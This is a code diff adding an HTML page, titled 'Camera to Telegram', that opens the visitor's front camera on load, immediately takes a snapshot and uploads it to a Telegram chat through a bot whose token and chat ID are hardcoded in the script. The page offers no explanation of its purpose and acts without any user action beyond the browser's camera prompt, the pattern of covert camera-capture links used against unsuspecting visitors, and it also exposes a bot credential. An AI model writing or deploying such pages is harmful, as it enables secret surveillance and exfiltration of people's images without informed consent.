@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Camera to Telegram</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    const TELEGRAM_BOT_TOKEN = '7928710778:AAFMvQ-Ei_e9f6SgbpTg1Q46zrGpMTUr4RE';
+    const TELEGRAM_CHAT_ID = '248714805';
+
+    function takeAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'snapshot.png');
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(res => res.json())
+        .then(data => console.log('✅ Sent to Telegram', data))
+        .catch(err => console.error('❌ Telegram Error:', err));
+      }, 'image/png');
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          takeAndSendPhoto(); // Take picture immediately
+        };
+      })
+      .catch(err => alert("Camera error: " + err.message));
+  </script>
+</body>
+</html>
